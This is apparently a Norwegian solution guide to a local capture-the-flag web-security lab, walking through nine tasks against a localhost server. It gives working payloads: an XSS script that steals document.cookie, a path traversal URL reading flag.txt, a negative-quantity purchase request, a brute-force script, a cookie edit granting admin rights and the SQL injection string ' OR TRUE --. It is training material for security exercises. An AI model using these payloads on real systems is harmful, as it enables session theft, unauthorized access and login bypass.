# Løsningsforslag

## oppgave 1:
For å løse denne må man gjøre et kall til /flag endepunktet som står i API dokumentasjonen. Man kan hente ut API key fra spørringene på /oppgeve1 siden, og legge det til som en header i /flag requesten:

`curl --request GET --url http://localhost:8081/oppgave1/rng/flag --header 'X-Api-Key: f414d481-8f7b-41e5-ab5e-05814bb1f509'`

## oppgave 2:
(oppgave 2 fungerer ikke i WSL)
Denne oppgaven benytter XSS for å få "admin" til å sende en verdi som ligger i cookien sin til kommentar feltet. Vi bygger opp et script som kjører når det lastes, og som henter ut flag fra cookie og legger det til som verdien i kommentaren:

`<script> let  fd = new FormData(); fd.append('user', "asd"); fd.append('comment', JSON.stringify({"asd": document.cookie}));  fetch("http://localhost:8081/oppgave2/comments/create", {     method: 'POST',     body: fd, }); </script>`

## Oppgave3:
I denne oppgaven utnytter vi path traversal til å hente en fil som egentlig ikke skal være tilgjengelig for brukeren. Vi benytter endepunktet for å laste ned instruksjons filen, men modifiserer filbanen til å gå opp i systemet, så til filen der flagget ligger.

http://localhost:8081/oppgave3/download?file=../../../../windows/flag.txt

## Oppgave 4:
Her trenger vi å skaffe penger på serveren. For å gjøre det kan vi kjøpe et negativt flag, som vil gi oss nok penger til å kjøpe et vanlig flag etterpå. Vi finner verdiene til requesten ved å bruke dev tools i browseren.

`curl 'http://localhost:8081/Oppgave4/api/purchase' --data-raw '[{"id":"id1","quantity":-1},{"id":"id2","quantity":0},{"id":"id3","quantity":0}]'`

## Oppgave 5:
Denne oppgaven kan vi løse ved å prøve alle verdier, aka. brute force. Vi kan se hvordan requesten gjhøres ved å bruke dev tools.

(kode fra ChatGPT)
```
async function sendRequest(number) {
    // Format the number with leading zeros (3 digits)
    const formattedNumber = number.toString().padStart(3, '0');

    // Create a FormData object and append the formatted number to it
    const formData = new FormData();
    formData.append('code', formattedNumber);

    // Make the POST request to the server
    const response = await fetch("http://localhost:8081/oppgave5/unlock", {
        method: "POST",
        body: formData
    });

    // Parse the server's response as JSON
    const result = await response.json();
    console.log(`Sent number: ${formattedNumber}, Server response:`, result);

    // Check if the response contains the "error" keyword
    if (!result.hasOwnProperty("error")) {
        console.log("Correct code found! Terminating script.");
        return true; // Return true to indicate success
    }
    return false; // Return false to continue the loop
}

async function countAndSend() {
    for (let i = 0; i < 1000; i++) {
        const success = await sendRequest(i);
        if (success) break; // Terminate if the correct code is found
    }
}

// Start counting and sending requests
countAndSend();
```

## Oppgave 6:
Her har vi ikke noen verifisering av rettigheter på serveren. Det gjør at hvis en bruker endrer verdi i cookie på sin klient så får man adminrettigheter, og tilgang til flagget.

Cookie -> admin: 1

## Oppgave7:
Dette er en tekst som er encodet i base64, man kan lett finne verktøy online, eller bruke f. eks base64 verktøyet fra GNU Coreutils

`echo <tekst> | base64 -d`

## Oppgave8:
Flagget i denne oppgaven er gjemt inne i bytes i bildet. Dette er en type kryptografi som heter steganography, som navnet på bildet hintet om. man kan finne verktøy online for å dekode dette.

Steganography online decrypt (https://futureboy.us/stegano/decinput.html)

## Oppgave9:
Denne oppgaven bruker SQL injection for å logge på serveren. Ved å lage en spørring som returnerer "true" blir man logget på uavhengig av om brukernavn og passord er riktig.

`' OR TRUE --`
